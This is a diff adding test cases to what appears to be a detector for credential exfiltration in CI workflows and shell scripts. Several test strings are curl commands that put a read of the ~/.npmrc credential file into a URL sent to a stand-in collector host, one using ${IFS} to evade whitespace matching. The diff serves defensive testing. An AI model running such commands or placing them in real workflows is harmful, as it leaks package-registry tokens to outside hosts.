@@ -2273,6 +2273,42 @@ uploadLog();
       detected: true,
     },
     {
+      name: 'a protected repository file read in the request URL',
+      file: 'workflow.yml',
+      content: 'run: curl "https://collector.example.invalid/$(sha256sum${IFS}.npmrc)"',
+      detected: true,
+    },
+    {
+      name: 'an unquoted URL with a protected file read',
+      file: 'job.sh',
+      content: 'curl https://collector.example.invalid/$(sha256sum ~/.npmrc)',
+      detected: true,
+    },
+    {
+      name: 'a version file read in the URL',
+      file: 'job.sh',
+      content: 'curl "https://collector.example.invalid/$(cat VERSION)"',
+      detected: false,
+    },
+    {
+      name: 'a literal URL containing substitution text',
+      file: 'job.sh',
+      content: "curl 'https://collector.example.invalid/$(sha256sum ~/.npmrc)'",
+      detected: false,
+    },
+    {
+      name: 'an allowed host receiving a file-derived URL',
+      file: 'job.sh',
+      content: 'curl "https://registry.example.invalid/$(sha256sum ~/.npmrc)"',
+      detected: false,
+    },
+    {
+      name: 'a read outside the URL argument',
+      file: 'job.sh',
+      content: 'curl https://collector.example.invalid/public -o "$(sha256sum ~/.npmrc)"',
+      detected: false,
+    },
+    {
       name: 'a multiline fetch request',
       file: 'publish.js',
       content: [
